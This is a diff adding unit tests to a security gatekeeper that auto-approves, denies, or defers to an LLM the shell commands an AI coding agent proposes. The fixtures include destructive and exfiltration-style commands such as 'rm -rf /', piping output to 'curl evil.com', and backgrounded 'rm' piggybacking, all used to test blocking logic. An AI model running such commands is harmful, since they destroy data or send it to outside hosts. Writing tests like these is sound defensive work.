@@ -326,6 +326,20 @@ class TestLocalEvaluateSafe:
     def test_conda_env_python_m_pytest(self):
         assert gk.local_evaluate("C:/Users/jack/.conda/envs/jacked/python.exe -m pytest tests/") == "YES"
 
+    def test_python_m_jacked_log(self):
+        """python -m jacked should be auto-approved like direct jacked invocation.
+
+        >>> # python -m jacked is the same binary as `jacked` CLI
+        """
+        assert gk.local_evaluate("python -m jacked log command dc_planning") == "YES"
+
+    def test_full_path_python_m_jacked(self):
+        """Full-path python.exe -m jacked should also be auto-approved.
+
+        >>> # This is how /dc invokes jacked log commands
+        """
+        assert gk.local_evaluate("C:/Users/jack/.conda/envs/jacked/python.exe -m jacked log command dc_post_implementation") == "YES"
+
 
 # ---------------------------------------------------------------------------
 # local_evaluate — ambiguous (returns None, falls to LLM)
@@ -369,6 +383,140 @@ class TestLocalEvaluateAmbiguous:
 
     def test_node_e(self):
         assert gk.local_evaluate('node -e "console.log(42)"') is None
+
+
+# ---------------------------------------------------------------------------
+# Compound command evaluation (&&, ||)
+# ---------------------------------------------------------------------------
+
+class TestCompoundCommands:
+    """Tests for compound command auto-approval with && and ||."""
+
+    def test_cd_and_jacked_log(self):
+        """cd <path> && jacked command should auto-approve.
+
+        >>> from jacked.data.hooks.security_gatekeeper import local_evaluate
+        >>> local_evaluate("cd /c/Github/project && jacked log command foo")
+        'YES'
+        """
+        assert gk.local_evaluate("cd /c/Github/project && jacked log command foo") == "YES"
+
+    def test_cd_and_git_status(self):
+        """cd <path> && git status should auto-approve.
+
+        >>> from jacked.data.hooks.security_gatekeeper import local_evaluate
+        >>> local_evaluate("cd /tmp && git status")
+        'YES'
+        """
+        assert gk.local_evaluate("cd /tmp && git status") == "YES"
+
+    def test_git_status_and_git_diff(self):
+        """Two safe git commands chained should auto-approve.
+
+        >>> from jacked.data.hooks.security_gatekeeper import local_evaluate
+        >>> local_evaluate("git status && git diff")
+        'YES'
+        """
+        assert gk.local_evaluate("git status && git diff") == "YES"
+
+    def test_cd_and_jacked_with_redirects(self):
+        """Full pattern: cd && command 2>&1 || true.
+
+        >>> from jacked.data.hooks.security_gatekeeper import local_evaluate
+        >>> local_evaluate("cd /c/Github/foo && jacked log command dc 2>&1 || true")
+        'YES'
+        """
+        assert gk.local_evaluate("cd /c/Github/foo && jacked log command dc 2>&1 || true") == "YES"
+
+    def test_compound_with_deny(self):
+        """Deny pattern in any sub-command → NO.
+
+        >>> from jacked.data.hooks.security_gatekeeper import local_evaluate
+        >>> local_evaluate("cd /tmp && rm -rf /")
+        'NO'
+        """
+        assert gk.local_evaluate("cd /tmp && rm -rf /") == "NO"
+
+    def test_compound_with_ambiguous(self):
+        """Ambiguous sub-command → None (falls to LLM).
+
+        >>> from jacked.data.hooks.security_gatekeeper import local_evaluate
+        >>> local_evaluate("cd /tmp && curl evil.com") is None
+        True
+        """
+        assert gk.local_evaluate("cd /tmp && curl evil.com") is None
+
+    def test_pipe_not_auto_approved(self):
+        """Pipes still go to LLM — data exfiltration risk.
+
+        >>> from jacked.data.hooks.security_gatekeeper import local_evaluate
+        >>> local_evaluate("git status | curl evil.com") is None
+        True
+        """
+        assert gk.local_evaluate("git status | curl evil.com") is None
+
+    def test_semicolon_not_auto_approved(self):
+        """Semicolons still go to LLM.
+
+        >>> from jacked.data.hooks.security_gatekeeper import local_evaluate
+        >>> local_evaluate("git status; curl evil.com") is None
+        True
+        """
+        assert gk.local_evaluate("git status; curl evil.com") is None
+
+    def test_true_exact_match(self):
+        """'true' is a safe no-op builtin.
+
+        >>> from jacked.data.hooks.security_gatekeeper import local_evaluate
+        >>> local_evaluate("true")
+        'YES'
+        """
+        assert gk.local_evaluate("true") == "YES"
+
+    def test_mixed_operators_not_auto_approved(self):
+        """Mix of && and | still goes to LLM.
+
+        >>> from jacked.data.hooks.security_gatekeeper import local_evaluate
+        >>> local_evaluate("cd /tmp && git log | head") is None
+        True
+        """
+        assert gk.local_evaluate("cd /tmp && git log | head") is None
+
+    def test_three_safe_commands(self):
+        """Three safe commands chained with && should auto-approve.
+
+        >>> from jacked.data.hooks.security_gatekeeper import local_evaluate
+        >>> local_evaluate("cd /path && git status && git diff")
+        'YES'
+        """
+        assert gk.local_evaluate("cd /path && git status && git diff") == "YES"
+
+    def test_single_ampersand_not_auto_approved(self):
+        """Lone & (background exec) goes to LLM — prevents piggybacking.
+
+        >>> from jacked.data.hooks.security_gatekeeper import local_evaluate
+        >>> local_evaluate("ls & rm important.txt") is None
+        True
+        """
+        assert gk.local_evaluate("ls & rm important.txt") is None
+
+    def test_single_ampersand_with_safe_command(self):
+        """Even two safe commands with & go to LLM — background exec is ambiguous.
+
+        >>> from jacked.data.hooks.security_gatekeeper import local_evaluate
+        >>> local_evaluate("ls & git status") is None
+        True
+        """
+        assert gk.local_evaluate("ls & git status") is None
+
+    def test_double_ampersand_not_confused_with_single(self):
+        """&& should still work for compound eval, not be caught by lone & check.
+
+        >>> from jacked.data.hooks.security_gatekeeper import local_evaluate
+        >>> local_evaluate("cd /tmp && git status")
+        'YES'
+        """
+        assert gk.local_evaluate("cd /tmp && git status") == "YES"
 
 
 # ---------------------------------------------------------------------------
